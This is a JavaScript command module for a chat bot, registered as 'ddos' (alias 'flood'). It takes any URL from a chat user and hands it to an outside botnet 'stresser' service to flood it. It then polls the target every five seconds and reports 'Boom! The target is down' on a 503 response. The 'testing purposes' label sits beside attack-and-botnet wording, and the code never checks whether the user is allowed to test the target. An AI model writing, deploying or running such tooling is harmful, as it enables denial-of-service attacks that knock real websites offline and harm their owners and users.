const axios = require("axios");

module.exports["config"] = {
    name: "ddos",
    type: "tools",
    role: 3,
    isPrefix: true,
    aliases: ["flood"],
    info: "Perform DDOS ATTACK on a target URL for testing purposes.",
    author: "Kenneth Panio",
    cd: 10,
    guide: "ddos http://example.com",
    usage: "[url]",
};

module.exports["run"] = async ({ args, chat, font }) => {
    const thin = txt => font.thin(txt);
    const url = args[0];

    if (!url) {
        return chat.reply(thin("Please provide a URL to attack."));
    }

    const initiate = await chat.reply(thin("Preparing to attack target..."));

    const status_msg = "Botnet is currently busy, try again later!";
    
    try {
        const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`, {
            timeout: 10000
        });

        initiate.unsend();
        chat.reply(thin(response.data.message));

        const checkInterval = setInterval(async () => {
            try {
                const checkStatus = await axios.get(url);

                if (checkStatus.status === 503) {
                    chat.reply(thin("Boom! The target is down (503 Service Unavailable)."));
                    clearInterval(checkInterval);
                }
            } catch (err) {
            }
        }, 5000);
        
    } catch (err) {
        if (err.code === 'ECONNABORTED') {
            chat.reply(thin(status_msg));
        } else if (err.response) {
            chat.reply(thin(err.response.data.error));
        } else {
            chat.reply(thin(status_msg));
        }
        initiate.unsend();
    }
};
